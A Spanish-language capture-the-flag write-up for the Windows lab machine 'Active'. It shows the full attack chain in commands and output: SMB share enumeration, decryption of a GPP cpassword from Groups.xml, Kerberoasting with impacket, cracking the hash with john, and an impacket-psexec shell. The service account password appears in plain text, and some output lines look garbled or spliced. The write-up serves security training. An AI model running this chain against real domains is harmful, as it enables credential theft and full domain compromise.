# Resolución maquina active

**Autor:** PepeMaquina  
**Fecha:** 29 de octubre de 2025  
**Dificultad:** Easy 
**Sistema Operativo:** Windows  
**Tags:** SMB, Gpp, Kerberoasting

---
## Imagen de la Máquina

![](active.jpg)

*Imagen: active.JPG*

## Reconocimiento Inicial

### Escaneo de Puertos
Comenzamos con un escaneo completo de nmap para identificar servicios expuestos:
~~~ bash
sudo nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.10.100 -oG networked
~~~
Luego queda realizar un escaneo detallado de puertos abiertos:
~~~ bash
sudo nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49157,49158,49165,49167,49168 10.10.10.100 -oN targeted
~~~
### Enumeración de Servicios

~~~bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-29 16:59:28Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49167/tcp open  msrpc         Microsoft Windows RPC
49168/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-29T17:00:20
|_  start_date: 2025-10-29T16:51:40
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
|_clock-skew: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.35 seconds
~~~
En este punto, se pueden ver todos los servicios, dando a lugar que si se trata de un ad al tener el puerto 88 (kerberos) abierto, pero algo inusual que se puede ver es que no se presenta ningun puerto para dar acceso al servidor como winrm, ssh o rdp, por lo que sera interesante encontrar una forma de interactuar directamente con el host.

### Enumeración de nombre del dominio
Lo primero que siempre hago, es enumerar el nombre del dominio y host, tanto como credenciales nulas y/o guest.
~~~ bash
sudo netexec smb 10.10.10.100 -u '' -p ''                                      
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\: 
~~~
Con ello ya guardamos la ip y el dominio con su respectivo host
~~~ bash
cat /etc/hosts
127.0.0.1       localhost
<SNIP>
10.10.10.100 active.htb dc dc.active.htb
~~~
### Enumeración detallada de los servicios 
Para realizar la enumeración, lo primero que veo son los recursos compartidos a los que tengo acceso, como no presento alguna credencial valida, lo pruebo con credenciales nulas.
~~~bash
sudo netexec smb 10.10.10.100 -u '' -p '' --shares
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\: 
SMB         10.10.10.100    445    DC               [*] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON                        Logon server share 
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL                          Logon server share 
SMB         10.10.10.100    445    DC               Users                           
~~~
Al ver los recursos, hay dos que me llaman la atención, entre ellos estan:
- Replication: A los que tengo permisos de lectura
- Users: A los que no tengo permiso alguno, pero posiblemente obtenga acceso con otro usuario.
Por lo que voy a enumerar el recurso "Replication"
~~~bash
impacket-smbclient active.htb/''@10.10.10.100
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use Replication
# ls
drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 .
drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 ..
drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 active.htb
# cd active.htb
# ls
cd drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 .
drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 ..
drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 DfsrPrivate
drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 Policies
drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 scripts
# cd Policies
# ls
drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 .
drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 ..
drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 {31B2F340-016D-11D2-945F-00C04FB984F9}
drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 {6AC1786C-016F-11D2-945F-00C04fB984F9}
# cd {31B2F340-016D-11D2-945F-00C04FB984F9}
# ls
drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 .
drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 ..
-rw-rw-rw-         23  Sat Jul 21 06:38:11 2018 GPT.INI
drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 Group Policy
drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 MACHINE
drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 USER
# cd MACHINE
# ls
drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 .
drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 ..
drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 Microsoft
drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 Preferences
-rw-rw-rw-       2788  Sat Jul 21 06:38:11 2018 Registry.pol
cd# cd Preferences
# ls
drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 .
drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 ..
drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 Groups
# cd Groups
# ls
drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 .
drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 ..
-rw-rw-rw-        533  Sat Jul 21 06:38:11 2018 Groups.xml
# get Groups.xml
# cd ..
# cd ..
# cd Microsoft
# ls
drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 .
drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 ..
drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 Windows NT
# cd Windows NT
l# ls
drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 .
drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 ..
drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 SecEdit
# cd SecEdit
# ls
drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 .
drw-rw-rw-          0  Sat Jul 21 06:37:44 2018 ..
-rw-rw-rw-       1098  Sat Jul 21 06:38:11 2018 GptTmpl.inf
# get GptTmpl.inf
~~~
Al parecer, parece una copia de las politicas del dominio, pero inspeccionando a detalle, se encontro las politicas de contraseñas, esto puede ser util porque sabiendo la estructura de las contraseñas se genera una lista de contraseñas mas adecuada a como funciona el dominio.
Pero lo mas importante que se encontro fue un archivo "groups.xml", al descargar este archivo, se ve un usuario y una contraseña.
~~~
cat Groups.xml     
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
~~~
De ello se puede ver que el usuario "SVC_TGS" (parece una cuenta de servicio) tiene una contraseña peculiarmente larga.
Primero probe la contraseña tal cual, sin modificar nada.
~~~bash
sudo netexec smb 10.10.10.100 -u ../users -p ../pass
SMB         10.10.10.100    445    DC               [-] active.htb\SVC_TGS:edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ STATUS_LOGON_FAILURE
~~~
Esta no fue efectiva y por ende no se tuvo acceso, asi que puede que este cifrada de alguna forma, intente ver esto con "hashid" pero no se obtuvo respuesta.
~~~bash
hashid -m hash_svc                                              
--File 'hash_svc'--
Analyzing 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
[+] Unknown hash
--End of file 'hash_svc'-- 
~~~
Entonces preguntando a la IA, esta sugiere que esta cifrada con GPP, históricamente es AES (Rijndael) con una clave estática y conocida que Microsoft usó para ese mecanismo de GPP.
Por ende averiguando en internet existe una utilidad en kali para descifrar dicha contraseña.
~~~bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GP<SNIP>18
~~~
Obteniendo asi una contraseña.
Como no se puede obtener acceso a la maquina por ningun medio como winrm, rdp o ssh, solo se me ocurre ver si se tiene acceso al recurso compartido "users" (o en ultima instancia utilizar bloodhound para mapear el dominio).
~~~bash
sudo netexec smb 10.10.10.100 -u users -p 'GPPstillStandingStrong2k18' --shares
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [-] active.htb\administrator:GPPstillStandingStrong2k18 STATUS_LOGON_FAILURE 
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
SMB         10.10.10.100    445    DC               [*] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share 
SMB         10.10.10.100    445    DC               Users           READ            
~~~
Como se puede ver, se tiene acceso al recurso "users" por lo que se ingresa en el para ver que contiene.

---
## User Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`

Al entrar al recurso compartido con "smbclient" se puede ver que es la misma carpeta "users" que habria dentro del dc, por lo que se dirige al usuario que tenemos y descargar la user flag.
~~~bash
smbclient -U 'SVC_TGS' //10.10.10.100/Users                               
Password for [WORKGROUP\SVC_TGS]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018

                5217023 blocks of size 4096. 278551 blocks available
smb: \> cd SVC_TGS\
smb: \SVC_TGS\> ls
  .                                   D        0  Sat Jul 21 11:16:32 2018
  ..                                  D        0  Sat Jul 21 11:16:32 2018
  Contacts                            D        0  Sat Jul 21 11:14:11 2018
  Desktop                             D        0  Sat Jul 21 11:14:42 2018
  Downloads                           D        0  Sat Jul 21 11:14:23 2018
  Favorites                           D        0  Sat Jul 21 11:14:44 2018
  Links                               D        0  Sat Jul 21 11:14:57 2018
  My Documents                        D        0  Sat Jul 21 11:15:03 2018
  My Music                            D        0  Sat Jul 21 11:15:32 2018
  My Pictures                         D        0  Sat Jul 21 11:15:43 2018
  My Videos                           D        0  Sat Jul 21 11:15:53 2018
  Saved Games                         D        0  Sat Jul 21 11:16:12 2018
  Searches                            D        0  Sat Jul 21 11:16:24 2018
cd
                5217023 blocks of size 4096. 278551 blocks available
smb: \SVC_TGS\> cd Desktop
smb: \SVC_TGS\Desktop\> ls
  .                                   D        0  Sat Jul 21 11:14:42 2018
  ..                                  D        0  Sat Jul 21 11:14:42 2018
  user.txt                           AR       34  Wed Oct 29 12:52:56 2025

                5217023 blocks of size 4096. 278551 blocks available
smb: \SVC_TGS\Desktop\> get user.txt
~~~
Ya descargada, se la puede ver en mi maquina atacante.
~~~bash
cat user.txt
<Encuentre su user flag>
~~~

---
## Escalada de Privilegios

### Revisión de permisos y/o privilegios
Como no se tiene acceso al dominio como tal, como para lanzar comandos o algun script de enumeración automatizado, segun mi metodologia, se me ocurre hacer 3 ataques:
- Kerberoasting.
- Asproast.
- Mapeo del dominio con bloodhound.
Asi que inclinando por la primera opción, se realiza un ataque kerberoasting con el usuario SVC_TGS para ver si se puede obtener algun hash valido.
~~~bash
impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2025-10-29 12:52:58.092173             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$61b2f<SNIP>4b3
~~~
Al parecer si se puede recuperar el hash del usuario administrator, por lo que se procede a intentar descifrarlo, esto con la herramienta "john the ripper"
~~~bash
sudo john hash_admin --wordlist=/usr/share/wordlists/rockyou.txt 
[sudo] password for kali: 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ti<SNIP>68 (?)     
1g 0:00:00:19 DONE (2025-10-29 14:23) 0.05010g/s 527955p/s 527955c/s 527955C/s Tiffani1432..Thrash1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
~~~
Despues de esperar un tiempo, si se logro descifrar el hash mediante un diccionario de contraseñas.

---
## Root Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`

Como en teoria se tienen credenciales del usuario "administrator" y no se tiene winrm abierto, existe una forma de entrar mediante el servicio SMB, esto funciona siempre y cuando se tengan los permisos elevados (dado que es admin, supongo que los tiene), por lo que se entra utilizando PSEXEC (esto crea un nuevo proceso para ganar una shell interactiva).
~~~bash
impacket-psexec administrator@10.10.10.100
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file nRFloWYC.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service GQQj on 10.10.10.100.....
[*] Starting service GQQj.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
~~~
Logrando asi tener acceso al sistema como administrator, ahora solo queda ver la root flag.
~~~powershell
C:\Windows\system32> cd /
C:\> users
C:\Users> cd administrator
C:\Users\Administrator> cd desktop
C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 15BB-D59C

and then execute smbexec.py again with -codec and the corresponding codec
29/10/2025  06:52                 34 root.txt

               1 File(s)             34 bytes
               2 Dir(s)   1.140.830.208 bytes free

C:\Users\Administrator\Desktop> type root.txt
The system cannot find the file specified.
Error occurred while processing: type.

root.txt
<Encuentre su propio root flag>
~~~
🎉 Sistema completamente comprometido - Root obtenido

